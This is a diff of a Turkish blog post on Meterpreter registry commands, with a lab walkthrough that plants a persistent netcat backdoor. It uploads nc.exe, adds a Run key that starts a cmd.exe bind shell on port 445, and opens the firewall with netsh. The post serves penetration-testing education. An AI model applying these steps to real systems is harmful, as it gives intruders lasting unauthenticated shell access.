@@ -5,7 +5,7 @@ date: 2017-05-25 09:04:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,18 +13,19 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework registry
+- msf meterpreter registry işlemleri
+
+excerpt: Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik sistemde gerekli yetkiyi almanızı sağlayabilir Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir.
 ---
 
-Interacting with the Registry
-The Windows registry is a magical place, where with just a few keystrokes you can render a system virtually unusable. So, be very careful on this next section as mistakes can be painful.
+# Windows Registry İşlemleri
 
-Meterpreter has some very useful functions for registry interaction. Let’s look at the options.
+Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir. 
 
+Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda ```reg``` komutunu verdiğinizde yardım bilgilerini görebilirsiniz. 
+
+```sh
 meterpreter > reg
 Usage: reg [command] [options]
 
@@ -47,20 +48,32 @@ COMMANDS:
     setval     Set a registry value [-k >key> -v >val> -d >data>]
     deleteval  Delete the supplied registry value [-k >key> -v >val>]
     queryval   Queries the data contents of a value [-k >key> -v >val>]
-Here we can see there are various options we can utilize to interact with the remote system. We have the full options of reading, writing, creating, and deleting remote registry entries. These can be used for any number of actions, including remote information gathering. Using the registry, one can find what files have been utilized, web sites visited in Internet Explorer, programs utilized, USB devices utilized, and so on.
+```
 
-There is a great quick reference list [List](https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf) of these interesting registry entries published by Access Data, as well as any number of internet references worth finding when there is something specific you are looking for.
+Yardım komutunun sonucunda görebileceğiniz gibi, ```reg``` komutu, Registry üzerinde okuma (```queryval```), yazma (```setval```), yeni ayarlama oluşturma (```createkey```) ve silme (```deletekey```) olanağı sağlamaktadır. 
 
-Persistent Netcat Backdoor
-In this example, instead of looking up information on the remote system, we will be installing a netcat backdoor. This includes changes to the system registry and firewall.
+Bu komutlar sayesinde yeni değerler oluşturma, değerleri değiştirme yapabileceğiniz gibi doğru yerlere bakarak sistem hakkında bilgi toplama işlemleri de yapabilirsiniz. Windows Registry içerisinde hangi değerin nerede kayıt edildiği hakkında kendinizi geliştirmenizi tavsiye ediyorum. Bir fikir vermesi açısından bağlantıda bulunan PDF dosyasını inceleyebilirsiniz. [List](https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf) 
 
-First, we must upload a copy of netcat to the remote system.
+## Kalıcı Netcat Arka Kapısı
 
-meterpreter > upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32
+Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme ```netcat``` programını yerleştireceğiz. Registry ayarlarında işlemler yaparak ```netcat``` programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının, ```netcat``` programına ve 445 numaralı porta müsaade etmesini sağlayacağız. 
+
+### nc.exe Programını Yükleme
+
+Öncelikle hedef Windows işletim sisteminin içerisine ```nc.exe``` olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde ```/usr/share/windows-binaries/``` klasöründe faydalı bir kaç programı bulabilirsiniz.
+
+
+```sh
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
 [*] uploading  : /tmp/nc.exe -> C:\windows\system32
 [*] uploaded   : /tmp/nc.exe -> C:\windows\system32nc.exe
-Afterwards, we work with the registry to have netcat execute on start up and listen on port 445. We do this by editing the key ‘HKLM\software\microsoft\windows\currentversion\run’.
+```
 
+### netcat Başlangıçta Otomatik Çalışsın
+
+nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde ```HKLM\software\microsoft\windows\currentversion\run``` anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin.
+
+```sh
 meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Enumerating: HKLM\software\microsoft\windows\currentversion\run
 
@@ -69,7 +82,11 @@ Enumerating: HKLM\software\microsoft\windows\currentversion\run
     VMware Tools
     VMware User Process
     quicktftpserver
+```
 
+Komut çıktısında görüldüğü gibi şu an için ```VMware Tools, VMware User Process, quicktftpserver``` yazılımları otomatik başlamaya ayarlanmış durumda. Biz yeni ayarımızı ```reg setval``` komutu ile ilave edelim ve ```reg queryval``` komutu ile tekrar kontrol edelim.
+
+```sh
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
 Successful set nc.
 meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
@@ -77,15 +94,26 @@ Key: HKLM\software\microsoft\windows\currentversion\Run
 Name: nc
 Type: REG_SZ
 Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
-Next, we need to alter the system to allow remote connections through the firewall to our netcat backdoor. We open up an interactive command prompt and use the ‘netsh’ command to make the changes as it is far less error prone than altering the registry directly. Plus, the process shown should work across more versions of Windows, as registry locations and functions are highly version and patch level dependent.
+```
 
+### Firewall Ayarları
+
+Doğrudan Registry ayarlarından yapabileceğinizi gibi ```netsh``` komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim.
+
+
+```sh
 meterpreter > execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
+C:\ >
+```
 
-C:\Documents and Settings\Jim\My Documents > netsh firewall show opmode
+Firewall ayarlarının mevcut halini görelim.
+
+```sh
+C:\ > netsh firewall show opmode
 Netsh firewall show opmode
 
 Domain profile configuration:
@@ -101,13 +129,20 @@ Exception mode                    = Enable
 Local Area Connection firewall configuration:
 -------------------------------------------------------------------
 Operational mode                  = Enable
-We open up port 445 in the firewall and double-check that it was set properly.
+```
 
-C:\Documents and Settings\Jim\My Documents > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+Şimdi 445 numaralı Portu izin verilen Portlar arasına ekleyelim.
+
+```sh
+C:\ > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 Ok.
+```
 
-C:\Documents and Settings\Jim\My Documents > netsh firewall show portopening
+Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.
+
+```sh
+C:\ > netsh firewall show portopening
 netsh firewall show portopening
 
 Port configuration for Domain profile:
@@ -128,21 +163,24 @@ Port   Protocol  Mode     Name
 138    UDP       Enable   NetBIOS Datagram Service
 
 
-C:\Documents and Settings\Jim\My Documents >
-So with that being completed, we will reboot the remote system and test out the netcat shell.
+C:\ >
+```
 
+Hedef sistem tekrar başladığında ```nc.exe``` otomatik olarak çalışacak ve dışarıdan bağlantılara imkan sağlayacaktır. Aşağıdaki örnekte ```nc``` komutuyla hedef sisteme bağlanılabildiği görülmektedir.
+
+```sh
 root@kali:~# nc -v 172.16.104.128 445
 172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
 (UNKNOWN) [172.16.104.128] 445 (?) open
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
-C:\Documents and Settings\Jim > dir
+C:\ > dir
 dir
 Volume in drive C has no label.
 Volume Serial Number is E423-E726
 
-Directory of C:\Documents and Settings\Jim
+Directory of C:\
 
 05/03/2009 01:43 AM
 .
@@ -163,8 +201,9 @@ Start Menu
 4 File(s) 0 bytes
 6 Dir(s) 35,540,791,296 bytes free
 
-C:\Documents and Settings\Jim >
-Wonderful! In a real world situation, we would not be using such a simple backdoor as this, with no authentication or encryption, however the principles of this process remain the same for other changes to the system, and other sorts of programs one might want to execute on start up.
+C:\ >
+```
 
+Gerçek durumlarda, böyle bir arka kapı açmak bu kadar kolay olmasa da uygulanacak işlemlerin mantığı yukarıda anlatıldığı gibidir. Bu yazıda, Registry kayıtları kullanarak bir arka kapı açmanın mantığını açıklamaya çalıştık. Yukarıdaki örneği birebir uygulayıp başarısız olursanız umutsuzluğa kapılmayın. Daha sıkı çalışın. 
 
 
